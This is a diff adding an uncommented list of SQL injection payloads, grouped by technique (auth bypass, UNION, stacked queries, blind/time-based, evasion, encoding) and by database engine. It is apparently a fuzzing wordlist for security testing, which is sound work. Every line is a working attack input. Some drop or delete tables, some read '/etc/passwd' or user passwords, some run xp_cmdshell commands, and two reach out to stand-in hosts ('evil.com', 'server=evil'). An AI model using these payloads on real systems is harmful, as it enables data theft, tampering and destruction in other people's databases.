@@ -1,0 +1,130 @@
+# SQL Injection Payloads
+# Categories: union-based, tautology, stacked queries, blind/time-based,
+#             comment evasion, encoding tricks, database-specific
+
+# === Tautology / Auth Bypass ===
+' OR 1=1 --
+' OR '1'='1' --
+' OR ''='
+" OR 1=1 --
+" OR ""="
+') OR ('1'='1
+admin' --
+admin'/*
+') OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+1' OR '1' = '1
+1' OR 1=1 -- -
+' OR 'x'='x
+' OR 1 --
+' OR 1=1 LIMIT 1 --
+' OR 1=1 LIMIT 1 -- -
+1 OR 1=1
+1' OR '1'='1' /*
+' OR 2>1 --
+' OR 'a'='a
+' OR 1=1 OR ''='
+' OR true --
+' OR 1 LIKE 1 --
+
+# === UNION-Based ===
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION ALL SELECT 1,2,3 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT table_name, NULL FROM information_schema.tables --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10 --
+0 UNION SELECT ALL 1,2,3,4,5 --
+' UNION SELECT @@version --
+' UNION SELECT version() --
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables --
+-1 UNION SELECT 1,load_file('/etc/passwd') --
+' UNION SELECT 1,2 INTO OUTFILE '/tmp/test.txt' --
+' UNION SELECT 1,CHAR(117,115,101,114,110,97,109,101) --
+
+# === Stacked Queries ===
+'; DROP TABLE users --
+'; DROP TABLE users; --
+'; INSERT INTO users VALUES ('hacker','pass') --
+'; UPDATE users SET password='hacked' WHERE username='admin' --
+'; DELETE FROM users WHERE 1=1 --
+'; EXEC xp_cmdshell('whoami') --
+'; EXECUTE IMMEDIATE 'DROP TABLE users' --
+1; SELECT * FROM users
+1; WAITFOR DELAY '0:0:5'
+1; SHUTDOWN --
+
+# === Blind / Time-Based ===
+' AND 1=1 --
+' AND 1=2 --
+' AND SUBSTRING(username,1,1)='a' --
+' AND (SELECT COUNT(*) FROM users)>0 --
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
+1 AND SLEEP(5) --
+1 AND BENCHMARK(10000000,SHA1('test')) --
+' OR SLEEP(5)#
+' AND IF(1=1,SLEEP(5),0)#
+'; WAITFOR DELAY '0:0:10' --
+1; SELECT pg_sleep(5) --
+' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+
+# === Comment Evasion ===
+' OR/**/1=1 --
+' UN/**/ION SEL/**/ECT 1,2,3 --
+'/**/OR/**/1/**/=/**/1/**/--
+' OR 1=1 --/*ignore*/
+/*!50000UNION*//*!50000SELECT*/1,2,3 --
+' /*!UNION*/ /*!SELECT*/ 1,2,3 --
+' UNION -- comment
+SELECT 1,2,3 --
+'||1=1 --
+
+# === Encoding Tricks ===
+%27%20OR%201%3D1%20--
+%27%20UNION%20SELECT%20NULL%20--
+%252527%2520OR%25201%253D1%2520--
+%u0027%u0020OR%u00201=1%u0020--
+&#39; OR 1=1 --
+&#x27; OR 1=1 --
+' OR CHAR(49)=CHAR(49) --
+' OR 0x31=0x31 --
+CONCAT(0x27,0x20,0x4F,0x52,0x20,0x31,0x3D,0x31)
+' OR 1=1 %00 --
+
+# === MySQL Specific ===
+' OR 1=1 LIMIT 1,1 --
+' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --
+' AND updatexml(1,concat(0x7e,(SELECT @@version)),1) --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+' AND EXP(~(SELECT * FROM (SELECT version())a)) --
+' OR MAKE_SET(1,version()) --
+
+# === PostgreSQL Specific ===
+' OR 1=1; -- -
+'; SELECT version() --
+'; COPY (SELECT '') TO '/tmp/out' --
+' AND 1=CAST((SELECT version()) AS int) --
+'; CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$ BEGIN PERFORM $1; END; $$ LANGUAGE plpgsql; --
+
+# === MSSQL Specific ===
+'; EXEC master..xp_cmdshell 'dir' --
+'; EXEC sp_makewebtask '/tmp/out.html','SELECT * FROM users' --
+'; SELECT * FROM OPENROWSET('SQLNCLI','server=evil;uid=sa;pwd=pass','SELECT 1') --
+' HAVING 1=1 --
+' GROUP BY users.id HAVING 1=1 --
+
+# === Oracle Specific ===
+' OR 1=1 --
+' UNION SELECT NULL FROM dual --
+' UNION SELECT banner FROM v$version WHERE ROWNUM=1 --
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.com') FROM dual) IS NOT NULL --
+' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) IS NOT NULL --
+
+# === SQLite Specific ===
+' UNION SELECT sql FROM sqlite_master --
+' UNION SELECT name FROM sqlite_master WHERE type='table' --
+' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) --
